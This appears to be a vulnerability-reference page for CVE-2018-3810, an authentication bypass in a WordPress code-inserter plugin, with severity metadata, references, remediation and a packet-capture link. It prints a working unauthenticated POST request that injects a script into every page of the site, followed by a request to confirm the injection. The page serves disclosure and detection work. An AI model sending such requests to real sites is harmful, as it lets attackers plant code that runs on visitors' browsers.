---
layout: post
cve_id: CVE-2018-3810
title: Oturia WordPress Smart Google Code Inserter <3.5 - Authentication Bypass
pcap: true
pcap_path: /pcaps/2018/CVE-2018-3810.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-3810.yaml
snort2_rule: N/A
snort3_rule: N/A
author: princechaddha
severity: critical
impact: 'An attacker can bypass authentication and gain unauthorized access to the
  affected WordPress site.

  '
remediation: 'Update to the latest version of the Oturia WordPress Smart Google Code
  Inserter plugin (3.5 or higher) to fix the authentication bypass vulnerability.

  '
reference:
- https://www.exploit-db.com/exploits/43420
- https://nvd.nist.gov/vuln/detail/CVE-2018-3810
- https://wordpress.org/plugins/smart-google-code-inserter/#developers
- https://limbenjamin.com/articles/smart-google-code-inserter-auth-bypass.html
- https://wpvulndb.com/vulnerabilities/8987
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2018-3810
  cwe-id: CWE-287
  epss-score: 0.92243
  epss-percentile: 0.99702
  cpe: cpe:2.3:a:oturia:smart_google_code_inserter:*:*:*:*:*:wordpress:*:*
metadata:
  max-request: 2
  vendor: oturia
  product: smart_google_code_inserter
  framework: wordpress
tags:
- cve
- cve2018
- wordpress
- google
- edb
- oturia
- vkev
- vuln
---

## ðŸ” Vulnerability Description
Oturia Smart Google Code Inserter plugin before 3.5 for WordPress allows unauthenticated attackers to insert arbitrary JavaScript or HTML code (via the sgcgoogleanalytic parameter) that runs on all pages served by WordPress. The saveGoogleCode() function in smartgooglecode.php does not check if the current request is made by an authorized user, thus allowing any unauthenticated user to successfully update the inserted code.

## ðŸŒ HTTP Request
```nohighlight
POST /wp-admin/options-general.php?page=smartcode HTTP/1.1
Host: www.victim.com
User-Agent: Moz111a/5.0 (1Pad; CPU 0S 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1
Connection: close
Content-Length: 120
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
sgcgoogleanalytic=<script>console.log("document.domain")</script>&sgcwebtools=&button=Save+Changes&action=savegooglecode
```

```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

